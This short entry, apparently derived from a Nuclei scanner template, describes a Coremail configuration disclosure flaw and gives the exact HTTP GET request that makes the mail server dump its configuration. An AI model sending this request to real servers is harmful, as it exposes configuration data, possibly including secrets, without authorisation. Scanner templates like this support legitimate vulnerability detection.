# Vulnerability: Coremail - Config Discovery
**Classification:** CONFIG
**Source:** Nuclei Template (`coremail-config-disclosure.yaml`)

## Description
Coremail configuration information was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mailsms/s?func=ADMIN:appState&dumpConfig=/
```

